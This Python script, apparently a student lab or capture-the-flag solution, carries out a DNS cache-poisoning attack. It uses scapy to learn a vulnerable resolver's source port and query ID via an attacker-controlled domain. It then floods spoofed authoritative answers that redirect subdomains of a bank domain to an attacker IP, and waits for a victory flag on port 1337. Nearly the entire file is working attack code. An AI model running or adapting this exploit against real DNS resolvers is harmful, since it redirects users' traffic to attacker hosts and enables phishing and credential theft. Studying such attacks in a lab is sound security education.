#! /usr/bin/env python3
# -*- coding: utf-8 -*-
"""Venom DNS server attacker

This script makes

"""
import string

from scapy.packet import Raw

from util import decode_dns_message

__author__ = "Andrea Lacava (1663286), Matteo Attenni (1655314), Ilaria Clemente (1836039)"
__credits__ = ["Andrea Lacava", "Matteo Attenni", "Ilaria Clemente"]
__license__ = "GPL"
__version__ = "1.0"
__email__ = "lacava.1663286@studenti.uniroma1.it, attenni.1655314@studenti.uniroma1.it, " \
            "clemente.1836039@studenti.uniroma1.it"
__status__ = "Production"

import sys
import threading
import time

from socket import *
from random import *

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff

# print headers just for debug and info
DNS_ROUTINE_HEADER = "[DNS_SERVER_ROUTINE]: "
BITE_THE_RAT_HEADER = "[BITE_THE_RAT]: "
LISTENER_HEADER = "[LISTENER_FLAG]: "
MAIN_HEADER = "[MAIN]: "

TARGET_IP = "192.168.56.101"  # vulnDNS's IP

BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
BAD_DNS_SERVER_PORT = 55553  # DNS endpoint port of badguy.ru (also present on config.json)

SPOOFED_DNS = "10.0.0.1"
URL_TO_POISON = "bankofallan.co.uk"
DNS_URL_BADGUY = "badguy.ru"

BADGUY_REDIRECT_IP = "192.168.56.1"
VICTORY_FLAG_PORT = 1337
BUFFER_SIZE = 8192

NUMBER_OF_PACKETS = 500  # number of packets per attempt
TIME_SLEEP_SECONDS = 3  # seconds of delay before attack

ATTACK_GOING_ON = True


# TARGET_PORT = 0
# STARTING_QUERY_ID = 0


def dns_server_routine():
    print(DNS_ROUTINE_HEADER + "Starting routine of DNS sniffer of badguy.ru")
    a = sniff(filter="port " + str(BAD_DNS_SERVER_PORT), count=1, promisc=1)
    if a[0].haslayer(IP):
        print(DNS_ROUTINE_HEADER + "Packet sniffed, analyzing..")
        sniffed_packet = a[0]
        sniffed_ip = sniffed_packet.getlayer(IP)
        target_port = sniffed_ip.sport
        print(DNS_ROUTINE_HEADER + "Sniffed ip src " + str(sniffed_ip.src) + ", src port: " + str(sniffed_ip.sport))
        print(DNS_ROUTINE_HEADER + "Dst ip:" + str(sniffed_ip.dst) + ", dest port:" + str(sniffed_ip.dport))
        print(DNS_ROUTINE_HEADER + "Target port response (source port) is " + str(target_port))
        first_query_id = decode_dns_message(a[0].getlayer(Raw).load)["id"]
        print(DNS_ROUTINE_HEADER + "Query Id found is " + str(first_query_id))
        dns_record_request = DNSQR(qname=DNS_URL_BADGUY)
        dns_answer = DNSRR(rrname=DNS_URL_BADGUY, type="A", ttl=600, rclass="IN", rdata="192.168.56.1")
        print(DNS_ROUTINE_HEADER + "Sending badguy.ru DNS response...")
        res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port) / DNS(id=first_query_id,
                                                                                       qr=1,
                                                                                       aa=1,
                                                                                       ra=0,
                                                                                       rcode=0,
                                                                                       qd=dns_record_request,
                                                                                       an=dns_answer)
        send(res_packet, verbose=0)
        print(DNS_ROUTINE_HEADER + "Response sent! starting attack thread")

        bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat,
                                           args=[target_port, first_query_id])
        print(DNS_ROUTINE_HEADER + "Bite the rat!")
        bite_rat_thread.start()
        bite_rat_thread.join()


def randomize_url(url_length=3):
    letters = string.ascii_lowercase
    return "".join(choice(letters) for i in range(url_length)) + "."


def random_query_id(last_query_id, modifier=0):
    last_query_id += randint(1, 500 + modifier)
    return last_query_id % 65536  # 16 bit maximum delimiter of query_id's DNS field


def bite_the_rat(target_port_sniffed, query_id):
    """
    Attack function.


    """
    query_id = random_query_id(query_id, 50)  # after badguy.ru req we notice there's an increase of queryid
    for j in range(NUMBER_OF_PACKETS):
        # since we've to guess the new query id we define an incremental pseudo random generator
        random_url = randomize_url(randint(1, 10)) + URL_TO_POISON
        guess_query_id = random_query_id(query_id)
        dns_record_req = DNSQR(qname=random_url, qtype="A")
        dns_answer = DNSRR(rrname=random_url, type="A", ttl=100, rclass="IN", rdata=BADGUY_REDIRECT_IP)
        dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=dns_record_req)
        attack_res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(sport=53, dport=target_port_sniffed) / DNS(
            id=guess_query_id,
            qr=1,
            aa=1,
            ra=0,
            qd=dns_record_req,
            an=dns_answer)
        print(BITE_THE_RAT_HEADER + "Send malicious request # " + str(j) + "...")
        send(dns_malicious_req, verbose=0)
        send(attack_res_packet, verbose=0)
        print(BITE_THE_RAT_HEADER + "Attack packet # " + str(j) + ", queryid: " +
              str(attack_res_packet.getlayer(DNS).id) + ", random_url: \"" + random_url + "\" ")

    print(BITE_THE_RAT_HEADER + "End attempt")


def flag_victory_listener():
    """
    This function listens on port 1337 the Victory flag.

    """
    sock = socket(AF_INET,  # Internet
                  SOCK_DGRAM)  # UDP
    print(LISTENER_HEADER + "Starting server...")
    sock.bind((BADGUY_REDIRECT_IP, VICTORY_FLAG_PORT))
    print(LISTENER_HEADER + "done!")
    global ATTACK_GOING_ON
    try:
        while ATTACK_GOING_ON:
            data, addr = sock.recvfrom(BUFFER_SIZE)
            print(LISTENER_HEADER + "\n\nReceived from \"" + addr[0] + "\": " + str(data) + "\n\n")
            ATTACK_GOING_ON = False
    except KeyboardInterrupt:
        print(LISTENER_HEADER + "Closing socket to exit gracefully...")
        sock.close()
        print(LISTENER_HEADER + "Socket closed, bye bye!")
        sys.exit(0)

    print(LISTENER_HEADER + "Attack finished, closing socket to exit gracefully...")
    sock.close()
    print(LISTENER_HEADER + "Socket closed, bye bye!")


def main():
    print(MAIN_HEADER + "Initializing attack...")
    flag_victory_thread = threading.Thread(name="flag_victory_thread", target=flag_victory_listener)
    print(MAIN_HEADER + "Listener thread created!")
    print(MAIN_HEADER + "Starting listener to get victory flag")
    flag_victory_thread.start()

    # point 1: send a dns request for badguy.ru
    global ATTACK_GOING_ON
    while ATTACK_GOING_ON:
        dns_badguy_thread = threading.Thread(name="dns_badguy_thread", target=dns_server_routine)
        print(MAIN_HEADER + "Starting DNS of badguy to get port and initial query id...")
        dns_badguy_thread.start()
        print(MAIN_HEADER + "Sleeping for " + str(TIME_SLEEP_SECONDS) + " seconds to allow DNS sniffer startup...")
        time.sleep(TIME_SLEEP_SECONDS)
        print(MAIN_HEADER + "Sending first request to " + TARGET_IP +
              " asking for badguy.ru to get an initial queryId and port with our DNS")
        # rd = 1 means recursion desired
        first_dns_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=DNS_URL_BADGUY))

        send(first_dns_req, verbose=0)
        dns_badguy_thread.join()

    flag_victory_thread.join()


if __name__ == "__main__":
    main()
